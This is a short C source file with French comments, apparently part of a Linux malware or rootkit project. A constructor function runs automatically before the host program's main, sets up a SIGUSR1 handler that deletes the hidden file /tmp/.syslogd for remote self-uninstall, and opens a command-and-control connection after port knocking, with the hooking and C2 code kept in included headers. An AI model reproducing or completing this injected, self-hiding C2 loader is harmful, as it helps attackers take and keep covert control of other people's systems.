#define _GNU_SOURCE
#include <dlfcn.h>
#include <signal.h>
#include "communication.h"
#include "hooking.h"

/**
 * Gestionnaire pour désinstaller le malware en cas de signal spécifique.
 */
void uninstall_handler(int signo) {
    if (signo == SIGUSR1) {
        unlink("/tmp/.syslogd"); // Suppression du fichier malveillant
        exit(0);                 // Arrêt du processus
    }
}

/**
 * Initialisation du malware (hook des fonctions et communication C2).
 */
__attribute__((constructor)) void initialize_malware() { // directive GCC qui indique que la fonction doit ce lancer avant le main donc programme principal
    // Installation du gestionnaire de signal pour la désinstallation à distance
    signal(SIGUSR1, uninstall_handler);

    // Connexion avec le serveur C2 (après port knocking)
    establish_c2_connection();
}
